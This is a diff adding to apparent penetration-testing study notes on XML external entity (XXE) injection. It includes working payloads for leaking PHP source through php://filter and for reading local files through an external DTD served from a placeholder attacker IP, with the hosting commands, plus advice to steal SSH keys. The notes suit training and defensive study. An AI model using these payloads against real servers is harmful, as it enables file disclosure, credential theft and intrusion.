@@ -49,3 +49,34 @@ done
 - When looking for which element of a XML input to inject our payload, look for elements that gets displayed in the response. 
 - Some pages looks like they only respond to JSON data, but they might not have disabeled XML. We can try to change the Content-Type to application/xml and convert the json data to xml with such tool: https://www.convertjson.com/json-to-xml.htm 
 - XML has a strict syntax on which characters to use, example space, |, <> {} may break it, so consider finding workaround for these characters. 
+- XML can also be used to leak source code, but sometimes we need to encode the file to be able to read it, ex: 
+```
+<!DOCTYPE email [
+  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
+]>
+```
+
+**Note:** XXE is usually used to disclose sensitive local files and source code, which may reveal additional vulnerabilities or ways to gain code execution.
+
+- XXE can be used to gain RCE, the easiest way is to look for ssh key on the server and try leaking them.  We can also use the expect module if it is installed. 
+
+**A more advanced way to leak files:**
+```
+<!DOCTYPE email [
+  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
+  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
+  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
+  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
+  %xxe;
+]>
+
+...
+
+<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
+```
+- Here we join the begin, file and end entities on our IP which gets fetched by the app server: 
+```shell
+HaakonWiland@htb[/htb]$ echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
+HaakonWiland@htb[/htb]$ python3 -m http.server 8000
+```
+- We must do this since xml does not allow joining of internal and external resources 
